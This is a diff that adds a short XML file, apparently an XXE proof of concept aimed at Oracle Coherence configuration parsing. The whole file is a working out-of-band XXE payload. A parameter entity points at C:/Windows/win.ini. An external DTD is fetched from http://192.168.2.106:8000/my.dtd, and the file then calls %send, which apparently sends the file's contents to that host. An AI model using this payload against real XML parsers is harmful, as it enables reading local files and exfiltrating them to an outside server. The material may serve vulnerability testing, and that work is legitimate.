@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE ANY [
+        <!ENTITY % file SYSTEM "file:///C:/Windows/win.ini">
+        <!ENTITY % dtd SYSTEM "http://192.168.2.106:8000/my.dtd">
+        %dtd;
+        %send;
+        ]>
+<ANY xmlns:xsi= "http://www.w3.org/2001/XMLSchema-instance"
+     xmlns="http://maven.apache.org/POM/4.0.0"
+     xsi:schemaLocation="http://xmlns.oracle.com/coherence/coherence-operational-config coherence-operational-config.xsd">
+</ANY>
